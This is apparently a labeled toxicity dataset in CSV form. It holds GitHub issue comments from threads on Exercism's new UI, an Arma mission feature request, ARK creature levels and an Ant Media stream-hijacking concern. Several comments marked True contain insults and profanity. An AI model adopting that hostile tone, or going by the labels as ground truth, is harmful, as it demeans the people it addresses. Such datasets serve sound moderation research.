_id,text,label,training,thread_label,thread_id
-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183/336263418,"Reference  you read this without a copy/paste to an editor ?  I can't. The old interface has a 'widen button' that hide the comment.  I liked that.  I seemed, at the time, like a clever piece of ergonomics not a Plan D bodge (kludge). I can't widen the solution box.  The whole Exercism uses only half my screen width.  How much technology have I at my finger tips ?  Is this really the ergonomic best we can do ? Copy/paste just to read a solution is not consistent with giving quality assistance on a budget of an hour a week. ",False,True,False,-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183
-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183/400703392,"Well, I like having the comment box side by side to the code I comment. Having to scroll back and forth between both when commenting is distracting and leads to errors in the comments. But as you do, I'd really welcome a wider code pane. ",False,True,False,-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183
-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183/400725098,"I too like having them side-by-side as I comment but I also just study the solution first. If I'm going to copy/paste one, I'd rather write the comments where I have spell checker.  It seems the old interface had auto-spell checking on and the new one doesn't.  I guess that is a separate issue. ",False,True,False,-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183
-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183/400733090,"@friend I appreciate your concerns and this is something we can discuss/consider. However, using language like ""a Plan D bodge (kludge)"", ""is this really the ergonomic best we can do ?"" is not in alignment with Exercism's values or the quality of empathetic discussion and feedback we expect, especially from our mentors. The team building this new website have put in thousands of unpaid hours of work into doing so and the negativity in your post is disheartening to all of us. While I genuinely appreciate you opening issues and raising these points, please can you do so in a way that is respectful and in line with our Code of Conduct, and that encourages the team to do work on this product rather than relaxing in our evenings. Thank you. ",False,True,False,-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183
-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183/400878634,"My apologies for breaking your code of conduct. I too am disheartened.  I have put many of my free hours into giving students feedback.  I grew fond, perhaps too fond, of the old Exercism site perhaps because it was not like other web sites. If this is beta testing then the features from the old site that I appreciated so much have been omitted by design and are not coming back. There are two core things I need to be able to do to mentor, everything else is nice to have.  I need to be able to read the submission and I need to be able to write, spell check, review and edit my comments over and over. I promised myself I would try mentoring on your new site.  I expect, as with other web sites, I will spend most of my time working in a text editor and copying/pasting to/from the finished GUI.  That would be a great shame. ",False,True,False,-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183
-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183/403047264,"@friend -- there are some features that are different by design, there are a number of features that we will be finishing and developing over the next few months. I'm not sure what we have done that has convinced you that we are not going to make it possible to do these two things. It seems quite key to anyone's workflow. Based on the above discussion, I'd like to ask you for two favors  When you are having trouble doing a thing that is core to your workflow, please make the assumption that we probably want the best experience. Please assume that we are smart and competent. When  things are imperfect, please assume that we have good reasons for it. Those reasons might be by design, but they also might not be that we just haven't gotten to it yet, or that our workflows are different and that we are unaware of your use case, and that if we can have discussion about it, we might very well agree that the problem you describe is something that we would like to fix. When you are trying to achieve something, then please describe what you are trying to achieve, rather than going straight to suggesting a particular solution. This lets us discuss the problem itself with you, and ask better, more useful questions, rather than having to try to reverse engineer a guess about what the underlying problem is.  ",False,True,False,-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183
-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183/403208888,"As I already said, I miss some wider view as well. But there is really no need for copy/pasting the code. You can  which will download the submission alongside with its associated tests, which you then can run locally. You can also open the code in your favorite editor, having your favorite colorschema in the highlighting, open another window doing the comments, markdown highlighting + spellchecker enabled. This is where one needs to copy/paste then though… For the old exercism (which uses a  instead of JavaScript) I have an browser addon which can open the textbox in emacs, associate the MD highlighter, activate the spellchecker and even injects some snippet commands related to the track I am currently on. But this plugin doesn't work with the new JavaScriptified comment box. But this is another issue… So the proper (intended) flow by design is probably to use the CLI to download the code and actually play with it locally. But I think this were much more obvious, if there actually were a copy pastable snippet to download the exercise in question… ",False,True,False,-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183
-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183/403237858,"@friend thank you very much for that.  I think will find downloading solutions this way very handy. The right information out of context can be meaningless.  In the right context you just say ""Ah, of course.  Why didn't I think of that."" ",False,True,False,-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183
-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183/403163177,"Thank you for your feedback.  I feel honoured somehow.  I wish I could reply succinctly, constructively, collaboratively and without sarcasm. I am not 'like minded'.  To me that phrase is linked to 'group think' and the Bay of Pigs Débâcle, Cuban Missile Crisis and all that ancient history only I am old enough to have been in the US at the time.   Group think is still behind many of the stupid mistakes made by groups of intelligent, experienced and dedicated people in business and politics the world over.  That's folks - they never learn. I have trouble seeing a naked, wrinkly, old man as an emperor in fine new clothes.  At work, those who want to save time and money love my insights, those who want to save face hate them.  Your new site will be launched.  It is too late for any one to question whether it is ready.  I certainly do not but I want to close my eyes so I can't see.  Qué sera, sera.  I wish you all the best. I did not think that I was suggesting a particular solution.  I am an analyst, not an engineer.  I was trying to understand the new UI and its workflow.  I do not know what I'm supposed to be assessing and, yes, that is frustrating.  I accept now that that is not my job and I am trying to keep off slack and github and am just trying to grok the workflow from using it. I too am smart and competent.  Do not think I underestimate you.  My great mistake, which I repeat over and over again, is assuming, until proven otherwise, that people I come in contact with as a smart and as competent as I.  My great frustration in life, in and out of work, is not being able to explain what I 'get' to others who do not.  I do not hide behind the word 'intuitive' because I can see that it certainly is not to them and I feel insulted when folk use the term on me but I keep being told GUIs are 'intuitive' (I think they think the word means something that cannot be explained in words).  To me GUIs are not intuitive and I was really not expecting your new one to be but I have not complained about this. I know you are a small team and you do the work in your free time for free.  I have not seen an appeal for developers but when you appealed for mentors I thought my forty years programming experience might be worth something.  I am out of work so I can spend a lot of time on it.  I was without broadband for a couple of weeks but I did not want to get left behind so I took a laptop to a café twice a day.  That was fraught as the laptop was old and not really up to the task.  When I got broadband back I expected things to be 100% better but I found ... well, please bear with me, ... I have been 'mentoring' unofficially on the Erlang track V1 for some time.  What you see as features you haven't 'gotten to' are features I saw as withdrawn and I expressed disappointment in language less than diplomatic.  I apologise for being months ahead of you. I apologise for having a different understanding of beta testing than you do.  I was expecting the workflow to be implemented, perhaps with bits not working properly, but not for bits to be missing.  I am really sorry about that.  I think very highly of V1 but I have no idea what to make of V2 at the moment.  Next time perhaps a pop up or tool tip that reads ""Coming soon"" would help. The V1 interface has a 'wide view' button that I often use when reviewing code.  This hides the comment so it is a trade-off and possibly an afterthought.  A bodge, perhaps, that I am very fond of.  Again my apologies if you find the term offensive but I very much liked that button and am sorry to see it go.  So I copy/paste the code into an editor where I can see at least each line in its entirety.  The current Solution box is only 64 characters wide and I've found the interface very 'responsive' but I cannot get the Solution box to show more code.  Sadly by the time that feature comes along I will either be set in my ways or will have found something else to spend too much time on. I need a spell checker for my comments and my browser used to give that with V1, underlining typos as I typed.  It does not with V2.  I suspect the comment box is now an active component that swallows characters as they are typed and unless the framework you have chosen has a spell checker feature you have not turned on yet, there will be little you can do to add that feature later.  Or perhaps it is just middleware. I remember when these WYSIWG text boxes first came out.  I used to disable them.  Now in several web-based applications I've no spell checker, copy/paste does not work 'intuitively' and I have to use HTML to get a blank line between paragraphs.  I don't hold that against the Exercism project or the team or its members.  I just prefer the V1 interface even though I can see that hurts. One last remark.  I have signed to mentor three tracks that are under represented.  My budget is one exercise on each track per week.  That would be 20 minutes for each exercise if I stick to the 1 hour you have asked for.  I think that is tight  I expect to overrun by 200% and if I don't approve a submission first time that will be yet more extra time.  That is based on my experience.  I have learnt from this beta trial that trying to mentor an exercise that I have not solved (on this track) is not a good idea so I have to work through all the exercises as a student too.  I saw somewhere that your estimates of how many mentors you need are based on 5 minutes a pop.  I am not disputing your calculations.  I am scared - I mean frightened - of what will happen if so many of the ra-ra-ra mentors who have signed up find mentoring requires much more of their time than they have thought and drop out.  The GUI I don't really care about.  Copy/paste in and out of the GUI I can cope with.  I do care about the quality of the mentoring.  I am really concerned that all involved are too optimistic about how much they can do with too little time.  But that's folks too - eternal optimists (even me in my own way). All the best to you and your team. ",False,True,False,-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183
-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183/405673807,Summarized in ,False,True,False,-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183
2018-1-OSS-E4/18-1-SKKU-OSS/3/394665010,Command 부분 번역하였습니다 ,False,True,False,2018-1-OSS-E4/18-1-SKKU-OSS/3
312-Development/nielse63/166/422486124,"The devDependency sharp was updated from  to . This version is not covered by your current version range. If you don’t accept this pull request, your project will work just like it did before. However, you might be missing out on a bunch of new features, fixes and/or performance improvements from the dependency update.  Find out more about this release. &lt;details&gt;   &lt;summary&gt;FAQ and help&lt;/summary&gt;    There is a collection of [frequently asked questions]( If those don’t help, you can always [ask the humans behind Greenkeeper]( Greenkeeper bot palm_tree ",False,True,False,312-Development/nielse63/166
A3-Antistasi/A3Antistasi/57/323119824,"Version 1.0.0+ Mods CBA, TFAR, ACE(no-medical) Environment MP dedi .rpt attatched? NO have you edited the missionfile? NO Is it possible to add a parameter such as ""load save"" to the parameters (lobby) of the mission? It will automatically load the previous saving of the campaign, by default (for your servers) you can set it to whatever value you want, for example, it's off, me and other server owners are very comfortable will be when I can turn it on (for example, through the cfg file) ",False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/389837101,Will study the possibility. It seems a good idea ,False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/393246500,"belive me it’s not low priority task, it’s very very important task you are very good man if you do, it’s not so complicated ",False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/393329149,but there are more important tasks and my time is not unlimited ,False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/393766966,"yeah, I did not expect anything else, thanks ",False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/393819419,"If you want to make it quicker you can allways provide the code here and I Will implement it in seconds. And if not, after telling you that I Will do, you come here with hurry and get dissapointed because I tell you the priorities of the mission development????? May I say that I am not your fucking slave or is it incorrect? ",True,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/393877509,"@friend actually yes it is, i understand the frustation but lets keep it respectfull and enjoyable for everyone, especially that I think you guys just misunderstood due to language translation. In the meantime @friend you are more than welcome to fork this repo, fix this issue and send us a pull request ;) I invite everyone to take 5minute to read this  ",False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/393885143,What is not subject to translations is your -1 reaction and your closing of the Issue ,False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/394032149,"It's actually a functionality which we have already implemented in the community version of Antistasi. It worked this way There was a parameter ""Allow to start a new campaign"" which was OFF by default. If you wanted to start a new campaign, you'd set it to ON manually and then the menu would ask you if you wanted to make a new start. The reason behind this is to ease the administration of automatic server restarts when there is no administration instantly available. It also helped us a lot at the official server because users would just join the game and the progress would get loaded. I am not sure if the autoload is currently present in the mission. ",False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/394152150,"Honestly, it's unclear who this dude thinks himself to talk to me like that. I could certainly put this rude person in place, but I'm not going to do it. You can do what you think is necessary, but I'm not going to help you any more. And more - you can use Google translator when reading the text, without risking to lose the sense of what is written. ",False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/394156172,"This dude is the owner of this mission and got all rights on this code, if it says it's interresting but got more important issues that's how it is. You've been welcomed multiple times to  as you said. Your ambiguous comments (that you deleted...) and you closing the issue show your lack of maturity. Even worse, you are threatening people on a collaborative platform ? Closing issue drama has not is place here. ",False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/394170424,"This dude is the owner of this mission and got all rights on this code, if it says it's interresting but got more important issues that's how it is. - это ты вообще к чему написал?  You've been welcomed multiple times to quickly and very easily fix this very important issue as you said.  и что, это даёт возможность мне хамить??? Your ambiguous comments (that you deleted...) and you closing the issue show your lack of maturity. Even worse, you are threatening people on a collaborative platform ? - это вообще враньё,, откуда ты это взял? Closing issue drama has not is place here. - это новое слово в драме? не слыхал о таком - я автор темы, хочу - закрываю  ",False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/394175475,"@friend I repeat you are more than welcome to help posting issues and PR on this repository, in english ;) Issue will be treated later on. ",False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/394294547,"Thanks @friend. Back to the roots, omitting his lack of social skills and education, Alex idea was good and Will be implemented (once I finish the whole AI suite which is by far more important). ",False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/394295262,"Will try to persistent save YES by default and only being able to be changed by server admins, so new starts Will allways depend on an admin. Switch commander yes by default and membership yes by default, but those will get overriden once the load is done. ",False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/394313318,"Can you check @friend solution that was on 1.8 version ? The goal is to actually not need any admin at mission restart, in cohesion with the member server/mission restart, especially in the case of auto restart servers. ",False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/394319595,its more or less the same I Will add this and some other options with defaults. Life will be easier. ,False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/394339711,"I proposed a similar solution in a forum thread so for each of theese options we could make a parameter in the parameters menu. Each parameter will have three options Force ON, Force OFF, Default. The 3rd one (Default) will cause default behaviour with GUI appearing at mission start. Others will force the corresponding options to one of the two states. So We have total compatibility with people already running the mission and we add possibility for other admins to set it to whatever they want. ",False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/394397956,"These are my notes of the params I Will add, pls do not hesitate to suggest a few more Load last Save def Yes Server membership (Overriden upon Load) def Yes. Switch Comm Def yes. TK Punish Def Yes. Mission Radius Def 4Kmts (4,8,12) Allow PvP def No Allow player markers def Yes AI Skill def Medium (mult 0.5,1,2) No of same ítems in Arsenal to unlock def 25 (15,25,50) Civ Traffic Level def Medium (mult 0.5,1,2) So if the server is started by an admin he Will be able to tweak whatever, if not, the default values are applied, and those are suitable for open dedis, no conflict with anything. From there, JiP players Will see the traditional Load window for their personal saves, and nothing else. ",False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/394801641,Arsenal restrictions for non-members allow/forbid taking non-unlocked weapons. In case people want to have membership without these weapon restrictions. ,False,True,False,A3-Antistasi/A3Antistasi/57
A3-Antistasi/A3Antistasi/57/396178952,"Non members picking non unlocked weapons can mess the game, as in other topics, so if ppl wants to allow that kind of thing they may just disable the membership requirement. Closing as it's already implemented. ",False,True,False,A3-Antistasi/A3Antistasi/57
ARKStatsExtractor/cadon/850/390246869,"Can anyone explain to me why this Tek Rex is importing wrong, all the values are correct, but the wild level should be 360 and not 432.  ",False,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446710661,should also post a screen shot of the ingame inventory also so anyone trying to help has more information to help you ,False,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446794674,"Why, I stated that the values are correct. ",False,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446795711,seriously? cuz you are asking for help and im telling you something might help and you question it. dont expect anything further from me as you cant seem to bothered you even help yourself without being an ass ,True,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446800019,"Assuming all provided information is correct (I'll take your word for it), you admin spawned this Tek Rex or it was generated some other way other than it being tamed. It's current level, 648, is it's post tamed level, you have a TE of 100%, and the only possible way to have 0 domestic levels with 100% TE is the creature was found in the wild at level 432 based on the (proven) level calculation of 432  (1 + (0.5  1)) =  648. The equation is PreTameLevel  (1 + (0.5  TE)) = PostTameLevel. If the creature has 0 domestic levels, it's current level MUST equal its post tame level. If any of this is incorrect, that will completely change the TE and the extracted pretame level. If you'd like further assistance, please provide the requested information. ",False,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446810586,"Assuming you made 100% false assumptions, this is something that has only just happened. I don't have any issue with any other Dino being tamed and it is only the Tex Rex at this stage that I have noticed it with. The current level is its post tamed level and I do indeed have a 100% tame on it. Like I said all the GREEN parts are 100% correct, I DO NOT HAVE ANY ISSUE WITH THE SPINO'S that I have added, I DO NOT HAVE ANY ISSUE WITH THE NORMAL REX'S that I have added. And this was not an issue a few months ago, so why is it an issue now!!! And I DON'T SEE WHY I NEED TO POST A SCREEN SHOT OF THE STATS WHEN THEY ARE 100% CORRECT. Seriously the support from everyone but the author  is becoming a joke in here now. ",True,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446811141,"And instead of arguing about what I haven't show, when I have been suing this program for 3 years and never had issues on my server to this extent, that I am dealing with people who refuse to acknowledge that I have stated the GREEN sections in the image are exactly what is on this Tek Rex. But you know what I should post it just to show how much time has been wasted chasing something that is not even the issue. ",True,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446811326,Math doesn't lie. 360  (1 + (0.5  1)) = 540. You creature is clearly higher level than that so you're either wrong or you're missing something. I have checked the numbers you provided and the lowest possible level is 432 with 100% TE. I'm not sure what you expect the author to do for you if you refuse to provide adequate information to help troubleshoot the issue. ,False,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446811736,"Like I said this has never been an issue before and like I said my Spino works, my normal Rex works ",False,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446811944,"If the server's max level is 360, a Tek Rex can spawn 20% higher level causing it to be level 432. The program is correct here, your understanding of Ark is incorrect. ",False,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446812317,the servers wild level is 300 and I am very well aware how that all works. Seriously!!!!!!!!!!!!!!!! ,True,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446818149,"and here is a Tek Stego, which also works  ",False,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446812998,"And because you are not listening and going on some wild tangent rant about what you think Here is a list of Dinos, tamed and show the correct Wild Level  ",True,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446818309,That attitude will get you nowhere with developers who are kindly giving you their time for free. ,False,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446818491,It appears the Tek Raptor has the same issue ,False,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446818625,"Maybe when I state that the values in the extractor are correct, people should listen!!! ",False,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446818991,Yep both the Tek Raptor and Tek Rex are the only two Dino's I can find that have this issue. ,False,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/446819551,"Look, I told you earlier, your understanding of Ark is wrong. When using the gmsummon command for the Tek creatures, Ark instantly adds 20% to it's original level. The command  generates a level 648 Tek Rex (Identical to yours). The command , however, will spawn a wild level 360. If you  any Tek creature, you'll get the same result. Please, stop being so dense in the future. ",False,True,False,ARKStatsExtractor/cadon/850
ARKStatsExtractor/cadon/850/447590336,"ASB cannot know the wild level exactly, it uses a formula with the taming-effectiveness to determine it, and in most cases this is correct, sometimes it can be off by 1 level. The Tek-species are special in the way that they have 20 % more levels than their vanilla counterparts. Once they are spawned and you can see their level, e.g. with the spyglass, this is the true wild level, which should also be the level that ASB will display. If Tek-creatures are spawned with admin-commands, the levels can be off, as VolatilePulse explained. So if you spawn a Tek creature with a level of 300, it will actually spawn with a level of 360. So most certainly the Tek Rex you posted first, actually has a wild level of 432. If it was spawned with an admin-command and not by the game, probably the special handling of the additional 20 % led to the confusion. In conclusion, the wild-level which ASB shows is the level you can see on the wild dino when it walks around. As soon as admin-commands like  are used, their true wild level is higher, and also ASB will show this higher level. I'm sorry that you feel offended by the additional questions. I can assure you it's not that we don't believe your statements, it's just that ARK handles some things in a way that is not obvious and we also don't know. Sometimes ARK has bugs which produces wrong values like the HP of Troodons, sometimes ARK just behaves strange, like with the levels of Tek species. To find out what is going on in ARK and how things can be fixed in ASB, we need as much information as possible, so some questions may seem not related to the initial question. In this case it's probably important how the creatures are spawned in, i.e. if they spawned naturally in the game or were spawned in by admin-commands. So I ask you to have some patience with additional questions, usually it helps to resolve issues faster the more informations are available. ",False,True,False,ARKStatsExtractor/cadon/850
Adafruit_Python_BNO055/adafruit/7/216507431,"Response from _serial_send() was being checked regardless of whether ack, which may result is certain invalid register write error exceptions. ",False,True,False,Adafruit_Python_BNO055/adafruit/7
Adafruit_Python_BNO055/adafruit/7/493267656,"Thanks for the PR, but we are deprecating this library. I think this is fixed in the new library ",False,True,False,Adafruit_Python_BNO055/adafruit/7
Aether-Legacy/Modding-Legacy/341/355402720,Aether Legacy Version(s) Affected aether_legacy-1.12.2-v3.2 Forge version 1.12.2-forge1.12.2-14.23.4.2732 Extra Mods jurassicraft Issue Aerwhales despawn in like 10s How to reproduce look at the whale Crash log none ,False,True,False,Aether-Legacy/Modding-Legacy/341
Aether-Legacy/Modding-Legacy/341/458388192,"They despawn when out of range of the player, or when they get stuck. This is not an issue. ",False,True,False,Aether-Legacy/Modding-Legacy/341
Aether-Legacy/Modding-Legacy/341/458447977,no they spawn directly in front of you same for alot of the mobs you made a crappy port I am tempted to make my own port ,True,True,False,Aether-Legacy/Modding-Legacy/341
Aether-Legacy/Modding-Legacy/341/458482702,"Unfortunately only Modding Legacy has the proper permissions to create a port, however if you believe this is still an issue, please help us out by forking the repo and creating a pull request! Also, reopen this issue if you can otherwise show that it is happening or create a new one relating to Aerwhale's AI that definitely needs to be reworked. ",False,True,False,Aether-Legacy/Modding-Legacy/341
Aether-Legacy/Modding-Legacy/341/458556635,according to mojang eula I have the ability to redistrubite adapt and modify minecraft content without permission since you have to agree to their terms of service. ,False,True,False,Aether-Legacy/Modding-Legacy/341
Aether-Legacy/Modding-Legacy/341/458563508,"Yes sure, however content created by other mod authors is still licensed, in which the original Aether mod. We were given permission by the original team behind the mod as it was written here  I would still highly recommend forking the repo and helping contribute. Anyways, if you aren't happy with Aether Legacy with modern versions, feel free to play the original versions or try out Aether II. We're not professionals, we're just dudes that love to mod Minecraft. ",False,True,False,Aether-Legacy/Modding-Legacy/341
All-the-Matrices-back-end/EricLScace/29/234824100,"includes change password, update email address, and change name/organization password change is mandatory; other profile changes are optional. think about using gear icon to access settings. ",False,True,False,All-the-Matrices-back-end/EricLScace/29
All-the-Matrices-back-end/EricLScace/29/310886436,"Until API change (issue #120), will limit this to change of password. ",False,True,False,All-the-Matrices-back-end/EricLScace/29
All-the-Matrices-back-end/EricLScace/29/310926981,Done. See branch issue#29. ,False,True,False,All-the-Matrices-back-end/EricLScace/29
Ant-Media-Server/ant-media/579/381864713,"Hi there, I don't know if it's the proper place to ask this kind of questions, let me know if you'd rather have this published somewhere else. I'm currently doing some research on media streaming servers to integrate live streaming into Funkwhale, the project I'm working on. Ant media server looks like a really good pick for my use cases, but I'm not sure how to ensure viewers cannot hijack a stream. When creating a Stream in the interface, you can  Copy the RTMP publish url, like rtmp//localhost/LiveApp/499481361945988697107161,  being the Stream ID Copy the player embbed code, like ,  being the stream ID, the same one as in the publish URL  Since the Stream ID is used for publishing purposes, but also shared with viewers, my understanding is that any viewer can easily guess the publish URL by inspecting the player source and potentially hijack a stream. I may be completely wrong or missing something, but I'd like to double check that with you. Is this normal behaviour? Is there another way to achieve what I need (having a non guessable rmtp publishing link)? I can see that there is another issue linked to authentication ( but my idea was that providing a different, non guessable URL (with a different ID, but binded to the same stream) for viewing / publishing. Let me know if you need additional info, and thank you for the incredible work! ",False,True,False,Ant-Media-Server/ant-media/579
Ant-Media-Server/ant-media/579/441529764,"@friend  Yes, your mentioned use case is true, publishing and playing are performed according to the unique stream Id. For solve security concerns, Token Control mechanism is developed for the Enterprise Edition. This solution protects your publishing and playing operations. Please have a look at these wiki and blog pages. If you need further assistance please send an email to contact[at]antmedia.io. Blog   ",False,True,False,Ant-Media-Server/ant-media/579
Ant-Media-Server/ant-media/579/441609766,"@friend thank you for your answer, which raises some concerns. I understand that people need to earn a living, hence the community/enterprise edition split. However, in most if not all projects, the community edition implement the core features that are absolutely mandatory, while the enterprise edition add extra features that are needed for more advanced use cases or bigger installations. The way I understand it, a basic media streaming server allows  One user to publish a stream Everyone to receive a stream  Item 1 is simply not available in the community edition, since everyone can actually publish on any stream. In some cases, additional security is an extra feature, but that's not true here having an even basic restriction on who can publish on a given stream is part of the core use case. Without that, the software is actually dangerous to use for any real-world stream! Let me take a concrete example showing how bad it could be. Alice has a video game a stream on an Ant Media Server (Community edition), with some young viewers in the audience. Alice's streams are completely safe for any audience. But one day, for fun, someone decides to hijack Alice's stream and broadcast porn instead. They can do that in literally 1 minute, by simply examining the Stream URL in the page source and firing up OBS. Alice looses her audience, reputation, and can even be sued by angry parents. Knowing that publishing is left completely open, I don't understand why anyone would use the Community edition of Ant Media. The attack surface and risks are just too big. I sincerely think publishing should be protected by default in the community edition, and I hope that you'll consider that for the safety of viewers and streamers on your platform. ",False,True,False,Ant-Media-Server/ant-media/579
Ant-Media-Server/ant-media/579/441623136,"Thanks for your feedback. They are valuable for us. We will think about it with the team, make some evaluation and let you know. ",False,True,False,Ant-Media-Server/ant-media/579
Ant-Media-Server/ant-media/579/445741131,"Hi @friend, any news from the team? ",False,True,False,Ant-Media-Server/ant-media/579
Ant-Media-Server/ant-media/579/454098109,"Hi @friend, Sorry for late response ( We discussed with the team and decided to continue token control in Enterprise Edition. But we can support you about dealing with this issue with Community Edition. You can rename produced files (HLS m3u8 or Mp4) using Ant Media Server Muxers  Init methods ( an example, for HLS Muxer go to Init method and edit this line to change output file names  doing that, users can not guess stream publish id by analyzing stream URL. Please let us know if you have any issue or just send an email. ",False,True,False,Ant-Media-Server/ant-media/579
Ant-Media-Server/ant-media/579/454181430,"Hi @friend, thank you for reaching back to me I have to say I am a bit surprised by your team answer though. Did you consider the security risks associated with the current state of your software? If all Community Edition deployments and Enterprise Edition streams that do not use the Token Control feature are vulnerable to stream hijacking, I believe you have a responsability to fix that. Your current stance is ""our software is insecure, but you can enable a paid option to make it secure"". And even when paying, the token thing is still optional! That's simply not acceptable, especially since you're not advertising this huge security risk anywhere. We're not talking about enhanced, nice-to-have security here (like with two-factor authentication which could be a paid option only), it's about basic, indispensable security for publishers and viewers! Thank you for the code samples, but there is no point in implementing a workaround to secure your software if you're not planning to secure it yourself in the end. If it's really that simple, to fix, I think your team should take an hour or two to implement this fix and protect all the people using your software. ",True,True,False,Ant-Media-Server/ant-media/579
Ant-Media-Server/ant-media/579/454211570,So basically you have an extremely easy to exploit security vulnerability and decided to only fix this is the paid Enterprise Edition? ,False,True,False,Ant-Media-Server/ant-media/579
Ant-Media-Server/ant-media/579/454313184,"@friend thanks for the feedback. I should correct some points because it causes some misunderstandings. First of all Community edition provides more and more features even includes some enterprise features and used by lots of developers in the community. Using unique stream id both for streaming and playing is just about implementation example and you can manage other things on your application level based on this open-source project. I also gave an example about how you can change output name of streaming files that you will give to users. Therefore changing these names, users can not reach your stream (Alice's stream ) URL and you do not have any security threat at this point. To make it clear, One-time token implementation is developed for only limiting audience not for fixing a security issue. To sum up, Ant Media Server Community Edition is totally open source software and you can develop your application based on that, during these phases, you can change the structure, way of operation etc. Sure for them, you can get support, documentation etc every time. ",False,True,False,Ant-Media-Server/ant-media/579
AsyncDisplayKit/facebookarchive/2032/169411700,"Hi, I have a ""rather complex"" architecture for a view an ASCollectionNode with 3 ASCellNodes each containing an ASTableNode with N ASCellNodes. It all works great except for one little detail the ASTextNodes in my ASCellNodes at the last level, seem to ignore completely resizing correctly to manage multiple lines. I have set &amp;&amp;  on these ASTextNodes, however, they simple span forever on a single line. My first thought was the constrained size in the method was incorrect. But I logged it and the size is that of the cell… if all ASTextNodes had only one single line. Here is what I have Any ideas where this could come from ? Below are two screenshots of what happens…   ",False,True,False,AsyncDisplayKit/facebookarchive/2032
AzureStorageExplorer/microsoft/1308/434871924,"Storage Explorer Version 1.7.0 Platform/OS Windows 10 Architecture i86 Bug description Deletions from Azure Data Lake Store accounts remain in queued state in the Activities window even after they are finished. This causes these entries to be stuck in this window, since the ""Clear Completed"" and ""Clear Successful"" buttons don't remove them. Steps to Reproduce  Delete a file from an Azure Data Lake Store account  Expected Experience The delete activity shows up in the Activities window and is updated to a completed status after the deletion finishes. Actual Experience The delete activity remains in queued state even after the deletion finishes. Additional Context Here's a screenshot of my activities window after performing a few deletions. Note how the deletion is marked as successful in the group, but not for each individual stream.  ",False,True,False,AzureStorageExplorer/microsoft/1308
BAR/aowen87/244/336518105,"With QT-5 enabled trunk, If I click on 'Operators' or 'Add', then click anywhere else in the gui, those buttons maintain an 'active' or 'pressed' look. If I mouse-over the buttons, they go back to normal appearance.  This is with the default appearance settings on linux. -----------------------REDMINE MIGRATION----------------------- This ticket was migrated from Redmine. The following information could not be accurately captured in the new ticket Original author Kathleen Biagas Original creation 01/06/2016 0649 pm Original update 03/01/2016 0523 pm Ticket number 2497 ",False,True,False,BAR/aowen87/244
